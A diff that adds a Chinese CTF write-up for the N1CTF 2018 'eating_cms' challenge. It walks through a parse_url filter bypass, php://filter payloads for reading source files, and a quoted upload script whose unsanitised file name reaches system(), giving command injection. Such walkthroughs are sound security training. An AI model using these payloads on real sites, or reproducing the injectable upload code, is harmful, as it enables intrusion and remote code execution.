@@ -2679,6 +2679,109 @@ payload: `php://filter/convert.base64-encode/resource=index/../flag` 或 `php://
         # 同上
         ```
 
+### N1CTF 2018 eating_cms
+
+#### 知识点
+
+- parse_url 函数解析漏洞
+
+    parse_url 函数在解析时存在漏洞
+    在路径前多输入"//" 就会导致这个函数失效
+    如: `//user.php?page=php://filter/convert.base64-encode/resource=xxx`
+- 伪协议读文件
+- 命令执行
+
+#### 解题
+
+1. 看到登录页面，尝试了一下注册路径 `/register.php`, 存在注册页面，注册一个账户登录，看了一下源码，没发现什么有用的东西
+2. 猜测可能有sql注入，先fuzz了一下sql关键字，和报错注入的几个函数被禁了，括号，# 和空格也被禁了，尝试了一下单引号，可以通过，但是会被转义，所以应该与sql注入无关。
+3. 到这没思路了，看了wp，登录后的url存在一个page参数，这种情况可以尝试一下php伪协议读文件
+
+    在user.php中发现包含了function.php,读了一下function.php,在这个文件中发现waf过滤了几个文件，那我们就尝试访问一下
+
+    ```php
+    function filter_directory()
+    {
+        $keywords = ["flag","manage","ffffllllaaaaggg"];
+        $uri = parse_url($_SERVER["REQUEST_URI"]);
+        parse_str($uri['query'], $query);
+    //    var_dump($query);
+    //    die();
+        foreach($keywords as $token)
+        {
+            foreach($query as $k => $v)
+            {
+                if (stristr($k, $token))
+                    hacker();
+                if (stristr($v, $token))
+                    hacker();
+            }
+        }
+    }
+    ```
+    但是这几个名称都被过滤了，但是在解析url时它用到了parse_url函数，这里就要利用这个函数的解析漏洞
+
+    payload: `//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg`
+
+    这样就能读取到文件了
+
+    ```php
+    <?php
+    if (FLAG_SIG != 1){
+        die("you can not visit it directly");
+    }else {
+        echo "you can find sth in m4aaannngggeee";
+    }
+    ?>
+    ```
+    读取m4aaannngggeee
+
+    ```php
+    <?php
+    if (FLAG_SIG != 1){
+        die("you can not visit it directly");
+    }
+    include "templates/upload.html";
+    ?>
+    ```
+    访问`http://e6cd3ddc-023e-46e1-a2ee-f2b6a66d576f.node3.buuoj.cn/templates/upload.html`发现文件上传，上传以后404
+
+    读取upllloadddd.php
+    //user.php?page=php://filter/convert.base64-encode/resource=upllloadddd.php
+    ```php
+    <?php
+    $allowtype = array("gif","png","jpg");
+    $size = 10000000;
+    $path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";
+    $filename = $_FILES['file']['name'];
+    if(is_uploaded_file($_FILES['file']['tmp_name'])){
+        if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
+            die("error:can not move");
+        }
+    }else{
+        die("error:not an upload file！");
+    }
+    $newfile = $path.$filename;
+    echo "file upload success<br />";
+    echo $filename;
+    $picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
+    echo "<img src='data:image/png;base64,".$picdata."'></img>";
+    if($_FILES['file']['error']>0){
+        unlink($newfile);
+        die("Upload file error: ");
+    }
+    $ext = array_pop(explode(".",$_FILES['file']['name']));
+    if(!in_array($ext,$allowtype)){
+        unlink($newfile);
+    }
+    ?>
+    ```
+    没有任何过滤，非常明显的文件名代码执行漏洞，接着就是找到真正的上传点
+
+    之前读文件还发现一个m4aaannngggeee页面，找到上传点/user.php?page=m4aaannngggeee
+
+    上传文件，抓包修改文件名就可以了。
+
 ## BJDCTF2020 ZJCTF，不过如此(文件包含 + RCE-远程代码执行)
 
 源码
